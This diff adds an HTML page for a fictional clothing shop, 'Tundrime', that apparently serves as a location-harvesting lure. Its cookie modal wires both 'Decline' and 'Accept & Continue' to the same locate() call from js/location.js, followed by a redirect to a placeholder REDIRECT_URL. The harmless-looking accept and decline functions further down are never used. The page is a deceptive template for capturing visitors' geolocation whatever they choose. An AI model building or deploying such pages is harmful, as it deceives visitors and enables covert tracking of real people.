@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IO/Catalog - Desktop</title>
+    <link rel="stylesheet" href="./css/tundrime.styles.css">
+    <script type="text/javascript">
+    	if (window.location.protocol == "http:") {
+        	var restOfUrl = window.location.href.substr(5);
+        	window.location = "https:" + restOfUrl;
+    	}
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<script type="text/javascript" src="js/location.js"></script>
+</head>
+<body>
+    <!-- Cookie Modal -->
+    <div class="modal-overlay" id="cookieModal">
+        <div class="modal">
+            <div class="modal-icon">🍪</div>
+            <h2>Your Privacy Matters</h2>
+            <p>We value your privacy and want to be transparent about the data we collect to enhance your shopping experience.</p>
+            
+            <div class="data-list">
+                <h3>We collect:</h3>
+                <div class="data-item">Essential cookies for site functionality</div>
+                <div class="data-item">Your location for shipping and local offers</div>
+                <div class="data-item">Analytics data to improve your experience</div>
+                <div class="data-item">Marketing preferences for personalized content</div>
+            </div>
+            
+            <p>By continuing, you agree to our use of cookies and data collection practices. You can adjust your preferences anytime in settings.</p>
+            
+            <div class="modal-buttons">
+                <button id="requestButton" class="btn btn-secondary" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Decline</button>
+                <button id="requestButton" class="btn btn-primary" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Accept & Continue</button>
+            </div>
+        </div>
+    </div>
+    <!-- Header -->
+    <header class="header">
+        <div class="nav-container">
+            <a href="#" class="logo">Tundrime</a>
+            <nav>
+                <ul class="nav-links">
+                    <li><a href="#">New</a></li>
+                    <li><a href="#">Ales</a></li>
+                    <li><a href="#">Lookbook</a></li>
+                </ul>
+            </nav>
+            <div class="nav-icons">
+                <span>🔍</span>
+                <span>👤</span>
+                <span>🛒</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1>Feel yourself</h1>
+        </div>
+        <div class="hero-bg"></div>
+    </section>
+
+    <!-- Main Content -->
+    <div class="main-container">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <h3>Catalog</h3>
+            <ul>
+                <li><a href="#">Dress</a></li>
+                <li><a href="#">Blazer</a></li>
+                <li><a href="#">Cardigan</a></li>
+                <li><a href="#">Coats</a></li>
+                <li><a href="#">Jackets</a></li>
+                <li><a href="#">Blouse</a></li>
+                <li><a href="#">Knitwear</a></li>
+                <li><a href="#">Trousers</a></li>
+                <li><a href="#">Jeans</a></li>
+                <li><a href="#">Skirts</a></li>
+            </ul>
+        </aside>
+
+        <!-- Product Grid -->
+        <main class="content">
+            <div class="content-header">
+                <h2>Sort by ↓</h2>
+                <div class="filter-options">
+                    <span>Color ↓</span>
+                    <span>Size ↓</span>
+                    <span>Material ↓</span>
+                </div>
+            </div>
+
+            <div class="product-grid">
+                <div class="product-card">
+                    <div class="product-image">
+                        <img src="./images/linen_dress.jpg" alt="">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-name">Smoky linen dress</div>
+                        <div class="product-price">$2,499</div>
+                    </div>
+                </div>
+
+                <div class="product-card">
+                    <div class="product-image">
+                        <img src="./images/viscose_dress.jpg" alt="">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-name">Viscose dress</div>
+                        <div class="product-price">$2,699</div>
+                    </div>
+                </div>
+
+                <div class="product-card">
+                    <div class="product-image">
+                        <img src="./images/mohair_dress.jpg" alt="">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-name">Mohair dress</div>
+                        <div class="product-price">$2,999</div>
+                    </div>
+                </div>
+
+                <div class="product-card">
+                    <div class="product-image">
+                        <img src="./images/sun_dress.jpg" alt="">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-name">Set's dress</div>
+                        <div class="product-price">$2,799</div>
+                    </div>
+                </div>
+
+                <div class="product-card">
+                    <div class="product-image">
+                        <img src="./images/oversized_dress.jpg" alt="">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-name">Oversized dress</div>
+                        <div class="product-price">$2,199</div>
+                    </div>
+                </div>
+
+                <div class="product-card">
+                    <div class="product-image">
+                        <img src="./images/knit_mini_dress.jpg" alt="">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-name">Knit mini dress</div>
+                        <div class="product-price">$2,299</div>
+                    </div>
+                </div>
+
+                <div class="product-card">
+                    <div class="product-image">
+                        <img src="./images/combination_.jpg" alt="">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-name">Combination dress</div>
+                        <div class="product-price">$2,849</div>
+                    </div>
+                </div>
+
+                <div class="product-card">
+                    <div class="product-image">
+                        <img src="./images/hooby_dress.jpg" alt="">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-name">Hooby knit dress</div>
+                        <div class="product-price">$2,449</div>
+                    </div>
+                </div>
+
+                <div class="product-card">
+                    <div class="product-image">
+                        <img src="./images/round_dress.jpg" alt="">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-name">Tube wrap dress</div>
+                        <div class="product-price">$2,199</div>
+                    </div>
+                </div>
+            </div>
+
+            <div style="text-align: center; margin-top: 40px;">
+                <button style="padding: 12px 24px; background: #333; color: white; border: none; border-radius: 4px; cursor: pointer;">Show more</button>
+            </div>
+        </main>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-section">
+                <h4>Tundrime</h4>
+                <ul>
+                    <li><a href="#">Collections</a></li>
+                    <li><a href="#">About</a></li>
+                    <li><a href="#">Shipping</a></li>
+                    <li><a href="#">Returns</a></li>
+                    <li><a href="#">Size Guide</a></li>
+                    <li><a href="#">Care</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-section">
+                <h4>About company</h4>
+                <ul>
+                    <li><a href="#">Careers</a></li>
+                    <li><a href="#">News</a></li>
+                    <li><a href="#">Affiliate</a></li>
+                    <li><a href="#">Investors</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-section">
+                <h4>Documents</h4>
+                <ul>
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Terms of Use</a></li>
+                    <li><a href="#">Cookie Policy</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-section">
+                <h4>Weekly newsletter</h4>
+                <p style="font-size: 14px; color: #666; margin-bottom: 15px;">Get the latest updates on new products and upcoming sales</p>
+                <div class="newsletter">
+                    <input type="email" placeholder="Enter your email">
+                    <button>Subscribe</button>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function acceptCookies() {
+            document.getElementById('cookieModal').style.display = 'none';
+            // You can add analytics tracking here
+            console.log('Cookies accepted');
+        }
+
+        function declineCookies() {
+            document.getElementById('cookieModal').style.display = 'none';
+            // You can add logic for limited functionality here
+            console.log('Cookies declined');
+        }
+
+        // Optional: Auto-hide modal after some time (for demo purposes)
+        // setTimeout(() => {
+        //     document.getElementById('cookieModal').style.display = 'none';
+        // }, 10000);
+    </script>
+</body>
+</html>
